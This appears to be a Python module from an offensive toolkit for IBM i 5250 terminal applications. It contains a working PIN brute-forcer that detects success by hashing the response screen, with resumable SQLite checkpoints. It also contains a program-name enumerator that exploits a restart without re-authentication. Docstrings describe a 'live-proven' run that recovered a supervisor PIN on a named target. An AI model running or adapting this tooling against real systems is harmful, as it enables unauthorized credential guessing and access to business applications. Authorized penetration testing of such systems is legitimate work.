"""
D1 — FieldBruter: auto-brute against any input field, response-diff stop.
D2 — ProgramEnumerator: brute program-name suffixes after harvesting prefix.

Live-proven workflow (Mels Cargo, supervisor PIN at r18c23 len=4):
  1. Send a known-wrong value ('@@@@'), hash the response screen.
  2. Iterate candidates: send_field → wait → hash response.
  3. Stop when hash differs from the wrong-baseline.

The magic was '1337' — found in 32 manual tries. With FFW-inferred
numeric charset (10^4 = 10,000) at 0.5s rate-limit, worst case ~83 min.
With SQLite checkpoint, killable and resumable.
"""
import hashlib
import time
import sqlite3
import itertools
import re
from typing import Generator, Optional


# Charsets MUST be in ASCII-ordinal order: _candidates' resume_from
# filter uses string <= comparison, which only matches enumeration
# order when itertools.product walks chars in lex order.
CHARSETS = {
    "numeric":      "0123456789",
    "upper":        "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "alphanumeric": "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ",
}


class FieldBruter:
    """Brute one field. Resumable via SQLite. Rate-limited.

    The host doesn't lock out on bad attempts (Mels Cargo didn't —
    most internal IBM i apps don't). If it does, the response-hash
    changes and we false-positive on the lockout screen. Operator
    triages.
    """

    def __init__(self, hack5250, db: sqlite3.Connection):
        self.h = hack5250
        self.db = db
        self._init_schema()

    def _init_schema(self):
        self.db.execute("""
            CREATE TABLE IF NOT EXISTS Brutes (
                id INTEGER PRIMARY KEY,
                row INT, col INT, length INT,
                charset TEXT, last_tried TEXT,
                hit TEXT, started REAL, completed REAL,
                UNIQUE(row, col)
            )
        """)
        self.db.commit()

    def infer_charset(self, row: int, col: int) -> str:
        """Read FFW shift bits from last_screen. Numeric-only → 'numeric'.

        Field.numeric is set by tn5250._parse_sf when FFW shift bits
        match SHIFT_NUMERIC_ONLY/DIGITS_ONLY/SIGNED_NUMERIC. We trust it."""
        if self.h.last_screen is None:
            return "alphanumeric"
        for f in self.h.last_screen.fields:
            if f.row == row and f.col == col:
                return "numeric" if f.numeric else "alphanumeric"
        return "alphanumeric"

    def _candidates(self, charset: str, length: int,
                    resume_from: Optional[str] = None) -> Generator[str, None, None]:
        """Cartesian product over charset^length. Resumable.

        resume_from='05' → first yield is '06'. Lexicographic skip is
        cheap (string compare on fixed-width is ordinal)."""
        chars = CHARSETS[charset]
        for combo in itertools.product(chars, repeat=length):
            cand = "".join(combo)
            if resume_from and cand <= resume_from:
                continue
            yield cand

    def _screen_hash(self) -> str:
        """SHA256 of screen.text, truncated to 16 hex chars.

        Truncation is fine — we're comparing for difference, not
        cryptographic uniqueness. 64 bits of collision resistance is
        plenty for ~10K candidates."""
        screen = self.h.last_screen
        if screen is None:
            return ""
        return hashlib.sha256(screen.text.encode()).hexdigest()[:16]

    def brute(self, row: int, col: int, length: int,
              charset: Optional[str] = None,
              wordlist: Optional[list[str]] = None,
              rate_limit: float = 0.5,
              max_attempts: Optional[int] = None) -> Optional[str]:
        """Iterate candidates. Returns the hit value or None.

        wordlist takes precedence over charset enumeration. Auto-resumes
        if a Brutes row exists for this position with hit IS NULL.

        rate_limit=0 is allowed for tests (FakeHack5250 has no I/O)."""
        if charset is None:
            charset = self.infer_charset(row, col)

        # Baseline: send known-wrong, hash response. '@' (0x7C EBCDIC)
        # is unlikely to be a valid PIN/code character.
        self.h.send_field(row, col, "@" * length)
        if rate_limit:
            time.sleep(rate_limit)
        wrong_hash = self._screen_hash()

        # Resume?
        cur = self.db.execute(
            "SELECT last_tried FROM Brutes WHERE row=? AND col=? AND hit IS NULL",
            (row, col),
        )
        row_db = cur.fetchone()
        resume = row_db[0] if row_db else None

        cands = iter(wordlist) if wordlist else self._candidates(charset, length, resume)

        for n, cand in enumerate(cands):
            if max_attempts is not None and n >= max_attempts:
                break
            self.h.send_field(row, col, cand)
            if rate_limit:
                time.sleep(rate_limit)
            h = self._screen_hash()
            if h != wrong_hash:
                # HIT — screen changed
                self.db.execute(
                    "INSERT OR REPLACE INTO Brutes "
                    "(row, col, length, charset, last_tried, hit, completed) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (row, col, length, charset, cand, cand, time.time()),
                )
                self.db.commit()
                return cand
            # Checkpoint every 50
            if n > 0 and n % 50 == 0:
                self.db.execute(
                    "INSERT OR REPLACE INTO Brutes "
                    "(row, col, length, charset, last_tried) "
                    "VALUES (?, ?, ?, ?, ?)",
                    (row, col, length, charset, cand),
                )
                self.db.commit()
        return None


# ===========================================================================
# D2 — ProgramEnumerator
# ===========================================================================

class ProgramEnumerator:
    """Direct program-call brute. The IBM i transaction-enumeration equivalent.

    Live-proven (Mels Cargo): post-APCT abend, type MCMM at blank screen
    → transaction restarts. No re-auth. Program names visible at r2c1.

    Workflow:
      1. harvest_from_history() — scan storage for row-2 headers
      2. infer_prefix() — common prefix across discovered names
      3. enumerate() — try <prefix><AA>..<prefix><ZZ>
    """

    # Row-2 header pattern: program name is 2-8 uppercase chars at the
    # start of row 2, followed by whitespace. MCAD, MCOR, QCMD, etc.
    HEADER_PATTERN = re.compile(r'^\s*([A-Z]{2,8})\s')

    def __init__(self, hack5250):
        self.h = hack5250
        self.discovered: set[str] = set()
        self.callable: dict[str, str] = {}  # name → screen title

    def harvest_from_history(self) -> set[str]:
        """Scan storage for program names in row-2 headers.

        storage.all_logs() row format (storage.py:124):
          [0]=id, [1]=ts, [2]=C_S ('S'=server→client, 'C'=client→server),
          [3]=notes, [4]=?, [5]=RAW_DATA (bytes)
        """
        for row in self.h.storage.all_logs():
            if row[2] != "S":
                continue
            try:
                screen = self.h.protocol.parse(row[5])
            except Exception:
                continue
            if len(screen.rendered) < 2:
                continue
            line2 = "".join(screen.rendered[1])
            m = self.HEADER_PATTERN.match(line2)
            if m:
                self.discovered.add(m.group(1))
        return self.discovered

    def infer_prefix(self) -> Optional[str]:
        """Longest common prefix across discovered names. MCMM,MCOR,MCAD → 'MC'.

        Returns None if fewer than 2 names (can't infer from one)."""
        if len(self.discovered) < 2:
            return None
        names = sorted(self.discovered)
        # Walk down from the shortest name's length
        for i in range(min(len(n) for n in names), 0, -1):
            prefix = names[0][:i]
            if all(n.startswith(prefix) for n in names):
                return prefix
        return None

    def enumerate(self, prefix: Optional[str] = None,
                  suffix_charset: str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                  suffix_length: int = 2,
                  rate_limit: float = 0.5) -> dict[str, str]:
        """Try <prefix><AA>..<prefix><ZZ>. CLEAR + send_field for each.

        Skips already-discovered names (no point re-confirming). For
        each new candidate: CLEAR → wait → send_field(1,1,candidate)
        → wait → classify response by row-2 content.

        Returns self.callable: {name: row-2-title}.
        """
        if prefix is None:
            prefix = self.infer_prefix()
            if prefix is None:
                raise ValueError("No prefix inferred — provide prefix=")

        for combo in itertools.product(suffix_charset, repeat=suffix_length):
            candidate = prefix + "".join(combo)
            if candidate in self.discovered:
                continue

            self.h.send_aid("CLEAR")
            if rate_limit:
                time.sleep(rate_limit)
            self.h.send_field(1, 1, candidate)
            if rate_limit:
                time.sleep(rate_limit)

            screen = self.h.last_screen
            if screen is None or len(screen.rendered) < 2:
                continue
            title = "".join(screen.rendered[1]).strip()

            if candidate in title:
                # Program echoed its own name back — it's callable
                self.callable[candidate] = title
            elif title and "not found" not in title.lower() and "Abend" not in title:
                # Something happened that's not a clear rejection — flag it
                self.callable[candidate] = f"? {title[:40]}"

        return self.callable
